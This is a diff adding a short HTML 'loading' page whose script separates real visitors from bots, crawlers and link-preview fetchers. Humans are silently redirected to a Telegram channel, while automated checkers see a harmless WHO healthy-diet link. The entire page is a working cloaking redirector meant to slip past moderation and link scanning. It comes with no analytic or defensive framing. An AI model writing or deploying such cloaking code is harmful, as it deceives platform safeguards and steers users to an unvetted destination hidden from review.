@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Загрузка...</title>
+  <script>
+    const isRealUser = () => {
+      return !navigator.webdriver &&
+             navigator.plugins.length > 0 &&
+             screen.width > 320 &&
+             !/bot|facebook|crawler|preview/i.test(navigator.userAgent);
+    };
+
+    if (isRealUser()) {
+      window.location.href = "https://t.me/paradise_opt";
+    } else {
+      document.write("https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet");
+    }
+  </script>
+</head>
+<body></body>
+</html>
